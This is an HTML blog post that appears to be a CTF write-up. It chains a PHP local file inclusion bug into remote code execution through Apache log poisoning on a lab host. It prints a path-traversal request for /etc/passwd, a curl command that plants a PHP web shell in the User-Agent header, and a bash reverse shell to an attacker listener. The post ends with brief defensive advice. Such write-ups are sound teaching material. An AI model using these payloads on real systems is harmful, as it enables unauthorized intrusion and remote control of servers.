@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>From LFI to RCE via Log Poisoning | Alen Sebastian</title>
+  <meta name="description" content="Chaining LFI to RCE using log poisoning in Apache." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <div class="bg-glow glow-1"></div>
+  <div class="bg-glow glow-2"></div>
+
+  <!-- NAV -->
+  <nav class="navbar">
+    <a href="https://alensebastian.in" class="nav-logo">
+      <span class="nav-logo-bracket">&lt;</span>alen<span class="nav-logo-accent">sebastian</span><span class="nav-logo-bracket">/&gt;</span>
+    </a>
+    <div class="nav-links">
+      <a href="../index.html" class="nav-link"><i class="fas fa-arrow-left"></i> All Posts</a>
+      <a href="https://github.com/0xgh0stri13y" target="_blank" class="nav-link"><i class="fab fa-github"></i> GitHub</a>
+    </div>
+  </nav>
+
+  <!-- POST -->
+  <main class="post-page">
+    <article class="post-article">
+
+      <div class="post-article-meta">
+        <a href="../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Blog</a>
+        <span class="post-tag ctf">CTF Writeup</span>
+        <span class="post-date">Mar 09, 2026</span>
+        <span class="read-time"><i class="far fa-clock"></i> 8 min</span>
+      </div>
+
+      <h1 class="post-article-title">From LFI to RCE via Log Poisoning</h1>
+      <p class="post-article-subtitle">Chaining a local file inclusion bug in a PHP app into full remote code execution using Apache log poisoning.</p>
+
+      <div class="post-article-body">
+
+        <h2>Recon</h2>
+        <p>
+          Started with a standard service scan. Port 80 was running a PHP web app with a <code>page</code> GET parameter used for routing between pages.
+        </p>
+
+        <pre><code>nmap -sV -sC -p 80 target.htb</code></pre>
+
+        <h2>Finding the LFI</h2>
+        <p>
+          Fuzzing the <code>page</code> parameter with path traversal sequences revealed that the app was including files directly from disk without sanitisation.
+        </p>
+
+        <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1
+Host: target.htb</code></pre>
+
+        <p>Response returned a valid <code>/etc/passwd</code> — classic LFI confirmed.</p>
+
+        <h2>Log Poisoning for RCE</h2>
+        <p>
+          Since Apache logs were readable at <code>/var/log/apache2/access.log</code>, I injected a PHP webshell into the User-Agent header and then included the log file to trigger execution.
+        </p>
+
+        <pre><code># Inject payload into User-Agent
+curl -s "http://target.htb/" -A "&lt;?php system(\$_GET['cmd']); ?&gt;"
+
+# Execute via LFI
+curl "http://target.htb/index.php?page=../../../../var/log/apache2/access.log&cmd=id"</code></pre>
+
+        <h2>Reverse Shell</h2>
+        <p>From there, URL-encoded a bash reverse shell and caught it on a netcat listener.</p>
+
+        <pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.X/4444 0&gt;&amp;1'</code></pre>
+
+        <h2>Takeaway</h2>
+        <p>
+          Log poisoning works when two conditions align — an LFI that can read log files, and a web server writing attacker-controlled input into those logs. Always sanitise include paths and disable error-based disclosure in production.
+        </p>
+
+        <hr class="post-divider" />
+
+        <p class="post-article-footer">Questions or spotted an error? Hit me up on <a href="https://twitter.com/Al3nVettithanam" class="inline-link">Twitter</a> or <a href="mailto:alensebastianofficial@gmail.com" class="inline-link">email</a>.</p>
+      </div>
+
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <p>© 2026 <span class="footer-accent">Alen Sebastian</span> · <a href="https://alensebastian.in">alensebastian.in</a></p>
+  </footer>
+</body>
+</html>
